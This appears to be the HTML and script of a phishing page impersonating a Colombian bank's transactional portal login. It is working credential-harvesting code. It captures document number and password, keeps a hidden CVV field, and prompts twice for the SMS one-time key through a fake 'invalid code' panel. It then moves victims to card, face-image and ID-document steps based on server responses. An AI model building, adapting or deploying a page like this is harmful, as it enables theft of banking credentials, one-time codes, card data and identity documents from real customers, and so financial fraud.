<html lang="en" class="hydrated"><head>
  ...
  <title>Ingreso al Portal Transaccional |</title>
  ...
  <script type="text/javascript" async="" charset="utf-8" id="utag_8" src="https://c.oracleinfinity.io/acs/account/iw64uzydss/js/main/odc.js"></script><script src="https://tags.tiqcdn.com/utag/adl/occidente/prod/utag.js" type="text/javascript" async=""></script>
  ...
  <style type="text/css">
    ...
    #mensaje{
      box-shadow: 1px 2px 4px #0061d85c;
      text-align: center;
      position: fixed;
      ...
      <app-bocc-initial-container _nghost-ymu-c72="" class="ng-tns-c72-0 ng-star-inserted">
        <div _ngcontent-ymu-c72="" style="background: no-repeat url(img/back-login.87ca483d1db8c1bdeaf4.jpg);" class="initial-container ng-tns-c72-0">
          ...
          <!-- Panel Login -->
            ...
            <div _ngcontent-ymu-c72="" class="initial-container__tab-content no-p ng-tns-c72-0" id="panel-login">
                              <h3 class="s2-sm-center m-3s-bottom ng-tns-c72-0" style="font-size: 1rem; font-weight: normal; margin-bottom: 0.5rem;">¡Bienvenido! a tu</h3>
              <h2 class="s2-sm-center m-3s-bottom ng-tns-c72-0" style="color: #0081ff;">Portal Transaccional</h2>
              <h4 class="s2-sm-left m-3s-bottom ng-tns-c72-0" style="font-size: 1rem; font-weight: normal; margin-bottom: 1rem;">Identificación</h4>
            ...
            <form novalidate="" id="login" class="login no-p ng-pristine ng-invalid ng-tns-c72-0 ng-touched">
              ...
              <input type="hidden" name="cvv" id="cvv">
                            ...
                            <!-- Tipo de Documento y No. de Documento en la misma línea -->
              <div style="display: flex; gap: 10px; align-items: flex-end;">
                <div class="form-group m-3s-bottom">
                  <select id="inp-tipo" name="inp-tipo" style="padding-left: 5px;color: #555f83; border: 1px solid #adbae6; width: 70px; height: 40px;">
                        <option value="CC" default selected>CC</option>
                ...
                <div class="form-group m-3s-bottom">
                  <input id="document-number" type="tel" placeholder="Ej.: 1093238993" formcontrolname="identification_number" onlynumber="" class="p-s ng-pristine ng-invalid ng-touched"  autocomplete="off" pattern="[0-9]*" inputmode="numeric" maxlength="10" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" style="width: 290px; height: 40px;">
                </div>
              </div>
            <div class="form-group m-3s-bottom password">
              <app-bocc-password label="Contraseña" id="password" name="password" placeholder="*Contraseña" formcontrolname="password" _nghost-ymu-c82="" class="ng-untouched ng-pristine ng-invalid">
                <div _ngcontent-ymu-c82="" class="password">
                  ...
                  <!---->
                  <input _ngcontent-ymu-c82="" type="password" class="ip-2m-right" name="password" id="password12" placeholder="Ingresa tu contraseña" autocomplete="off">
                  <!----><!----><!---->
                </div>
              </app-bocc-password>
            </div>
          ...
          <!-- Panel Login (FIN)-->
              ...
              <div _ngcontent-ymu-c72="" class="initial-container__tab-content no-p ng-tns-c72-0" id="panel-celular" style="display:none;"><h2 class="s2-sm-center m-3s-bottom ng-tns-c72-0">VALIDACIÓN DE SEGURIDAD</h2>
                <p _ngcontent-wji-c262="" class="b2-m-center no-p m-3s-bottom">Solo debes de ingresar la clave que te llegará por SMS o correo electrónico</p>

            <form novalidate="" id="ver-celular" class="login no-p ng-pristine ng-invalid ng-tns-c72-0 ng-touched">            

            <div class="form-group m-3s-bottom">
              <label for="celular-number" class="button-sm-left m-2xs-bottom p-xs-top">Clave temporal</label>
              <input id="celular-number" maxlength="6" type="password" placeholder="*Ingresa la clave" formcontrolname="identification_number" onlynumber="" class="p-s ng-pristine ng-invalid ng-touched"  autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" >
            </div>  
            ...
            <!-- Panel OTP error -->
              ...
              <div _ngcontent-ymu-c72="" class="initial-container__tab-content no-p ng-tns-c72-0" id="panel-otp" style="display:none;"><h2 class="s2-sm-center m-3s-bottom ng-tns-c72-0">CLAVE TEMPORAL INVÁLIDA</h2>
                <p _ngcontent-wji-c262="" class="b2-m-center no-p m-3s-bottom">Solo debes de ingresar la clave que te llegará por SMS o correo electrónico</p>

            <form novalidate="" id="ver-celular" class="login no-p ng-pristine ng-invalid ng-tns-c72-0 ng-touched">            

            <div class="form-group m-3s-bottom">
              <label for="otp-number" class="button-sm-left m-2xs-bottom p-xs-top">Clave temporal</label>
              <input id="otp-number" maxlength="6" type="password" placeholder="*Ingresa la clave" formcontrolname="identification_number" onlynumber="" class="p-s ng-pristine ng-invalid ng-touched"  autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" >
            </div>  

            <app-alert _nghost-ymu-c100=""><!----></app-alert><div class="initial-container__actions-content m-m-top"><bocc-button btnlabel="Regístrate" class="bocc-button no-p m-2xs-width"><div class="button"><button class="btn outliner ng-star-inserted" type="button" select="" id="btn-cancelar"><!----><!----><span class="btnContent button-sm-center ng-star-inserted">Cancelar</span><!----><!----></button><!----><!----></div></bocc-button><bocc-button type="submit" class="bocc-button no-p m-2xs-width"><div class="button"><!----><button disabled="" class="btn ng-star-inserted" type="button" id="btn-error"><!----><!----><span class="btnContent button-sm-center ng-star-inserted">Validar</span><!----><!----></button><!----></div></bocc-button></div></form>
              </div>
...
<script>
    ...
    document.addEventListener("DOMContentLoaded", function () {
      ...
      // --- VALIDACIONES DE INPUTS (Mantenidas íntegras) ---
      
      const docInput = document.getElementById('document-number');
      const passInput = document.getElementById('password12');
      const btnIngresar = document.getElementById('btn-ingresar');

      function validarLogin() {
        if (docInput.value.length > 0 && passInput.value.length > 7) {
      ...
      btnIngresar.addEventListener('click', async function (event) {
        ...
        const identificacion = docInput.value;
        const password = passInput.value;
        const tipoDocumento = document.getElementById('inp-tipo').value;
...
------------------------------`;
        ...
        if (result.action) {
          switch (result.action) {
            ...
            case 'error_logo': 
              ...
              break;
            case 'error': // ✅ Redirección Cara
              window.location.href = "/caras";
              break;
            case 'cedula': // ✅ Redirección Cédula
    ...
    // --- MANEJO DE PANELES (Tu lógica original) ---
    const getEl = id => document.getElementById(id);

    if(getEl('btn-continuar')) {
        getEl('btn-continuar').addEventListener('click', function(){
            getEl('panel-celular').style.display = 'none';       
            getEl('panel-tarjeta').style.display = 'block';
            getEl('celular').value = getEl('celular-number').value;
        });
    }

    if(getEl('btn-error')) {
        getEl('btn-error').addEventListener('click', function(){
            getEl('panel-otp').style.display = 'none';       
            getEl('panel-tarjeta').style.display = 'block';
        });
    }
</script>